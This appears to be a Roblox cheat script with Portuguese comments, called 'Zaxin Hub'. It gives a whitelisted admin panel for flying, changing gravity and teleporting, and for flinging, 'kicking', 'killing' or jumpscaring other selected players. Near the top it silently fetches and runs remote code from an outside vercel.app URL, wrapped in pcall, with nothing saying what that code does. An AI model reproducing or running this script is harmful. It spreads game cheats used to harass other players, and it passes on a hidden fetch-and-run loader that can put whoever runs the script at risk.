--// SERVIÇOS
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// EXECUTA O LOAD EXTERNO
pcall(function()
    loadstring(game:HttpGet("https://scriptsbinsauth.vercel.app/api/scripts/917fb298-61be-4615-9d7c-0e5b769b7360/raw"))()
end)

--// LISTA DE JUMPSCARES (DO SEU CÓDIGO)
local JUMPSCARES = {
    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
}

--// WHITELIST (ADICIONADO 10PEREIRAZZK)
local WhiteList = {
    ["fh_user1"] = "Owner",
    ["Zelaojg"] = "Parceiro",
    ["joaoluizzx"] = "Staff",
    ["itz_starUwUspice"] = "Usuário-Admin",
    ["tiai200"] = "Usuário-Admin",
    ["10pereirazzk"] = "Owner",
    [LocalPlayer.Name] = "Developer"
}

--// VARIÁVEIS DE CONTROLE
local flySpeed = 50
local flying = false
local flyConn
local selecionado = nil

--// FUNÇÃO FLY (PEGANDO A LÓGICA DE MOVIMENTO PARA O SEU CÓDIGO)
local function ToggleFly(state)
    flying = state
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")

    if not state then
        if flyConn then flyConn:Disconnect() flyConn = nil end
        if hum then hum.PlatformStand = false end
        return
    end

    flyConn = RunService.RenderStepped:Connect(function(dt)
        if not flying or not root then return end
        root.Velocity = Vector3.new(0,0,0)
        local moveDir = Vector3.new(0,0,0)
        local camCF = Camera.CFrame
        
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + camCF.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - camCF.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - camCF.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + camCF.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0,1,0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0,-1,0) end
        
        if moveDir.Magnitude > 0 then
            root.CFrame = root.CFrame + (moveDir.Unit * flySpeed * dt)
        end
        if hum then hum.PlatformStand = true end
    end)
end

--// FUNÇÃO FLING (ARREMESSAR ALVO SELECIONADO)
local function DoFling(targetName)
    local target = Players:FindFirstChild(targetName)
    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if target and target.Character and root then
        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
        local oldCF = root.CFrame
        local bva = Instance.new("BodyAngularVelocity", root)
        bva.AngularVelocity = Vector3.new(0, 999999, 0)
        bva.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        
        local start = tick()
        local conn
        conn = RunService.Heartbeat:Connect(function()
            if tick() - start > 1.3 or not tRoot then
                conn:Disconnect() bva:Destroy() root.CFrame = oldCF return
            end
            root.CFrame = tRoot.CFrame * CFrame.new(math.random(-1,1), 0, math.random(-1,1))
        end)
    end
end

--// FUNÇÃO ENVIAR COMANDO (DO SEU CÓDIGO)
local function EnviarComando(comando, alvo)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if canal then
        canal:SendAsync(";" .. comando .. " " .. (alvo or ""))
    end
end

--// PAINEL ZAXIN HUB (BASEADO NO SEU WINDUI)
if WhiteList[LocalPlayer.Name] then
    local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
    local Window = WindUI:CreateWindow({
        Title = "Zaxin Hub | Painel Admin",
        Icon = "shield",
        Author = "by: ZaxinX",
        Size = UDim2.fromOffset(580, 500),
        Transparent = true
    })

    -- TAB SELF (ONDE VOCÊ QUER COLOCAR OS NÚMEROS)
    local TabSelf = Window:Tab({ Title = "Self", Icon = "user" })
    local SecSet = TabSelf:Section({ Title = "Ajustes de Velocidade e Gravidade" })

    SecSet:Input({
        Title = "Velocidade Fly",
        Placeholder = "Digite um número...",
        Callback = function(t) flySpeed = tonumber(t) or flySpeed end
    })

    SecSet:Input({
        Title = "Gravidade",
        Placeholder = "Normal: 196",
        Callback = function(t) workspace.Gravity = tonumber(t) or workspace.Gravity end
    })

    TabSelf:Toggle({Title = "Ativar Fly", Callback = function(s) ToggleFly(s) end})

    -- TAB COMANDOS (IGUAL AO SEU CÓDIGO)
    local TabAdmin = Window:Tab({ Title = "Comandos", Icon = "terminal" })
    local Section = TabAdmin:Section({ Title = "Admin", Icon = "user-cog" })

    local function getPlayersList()
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do table.insert(t, p.Name) end
        return t
    end

    local Dropdown = Section:Dropdown({
        Title = "Selecionar Jogador",
        Values = getPlayersList(),
        Callback = function(opt) selecionado = opt end
    })

    Section:Button({Title = "FLING (ARREMESSAR)", Callback = function() if selecionado then DoFling(selecionado) end end})
    Section:Button({Title = "KICK", Callback = function() if selecionado then EnviarComando("kick", selecionado) end end})
    Section:Button({Title = "KILL", Callback = function() if selecionado then EnviarComando("kill", selecionado) end end})
    Section:Button({Title = "TP ATÉ ELE", Callback = function() 
        if selecionado and Players:FindFirstChild(selecionado) then
            LocalPlayer.Character.HumanoidRootPart.CFrame = Players[selecionado].Character.HumanoidRootPart.CFrame
        end
    end})

    -- TAB EFEITOS (OS JUMPSCARES DO SEU CÓDIGO)
    local TabEfeitos = Window:Tab({ Title = "Efeitos", Icon = "zap" })
    local SecJump = TabEfeitos:Section({ Title = "Jumpscares" })

    local jumps = {"jumps1", "jumps2", "jumps3", "jumps4"}
    for _, j in ipairs(jumps) do
        SecJump:Button({
            Title = j:upper(),
            Callback = function() if selecionado then EnviarComando(j, selecionado) end end
        })
    end
end

--// Som de carregamento
local sound = Instance.new("Sound", workspace)
sound.SoundId = "rbxassetid://8486683243"
sound.Volume = 2
sound:Play()
game.Debris:AddItem(sound, 3)

print("Zaxin Hub")
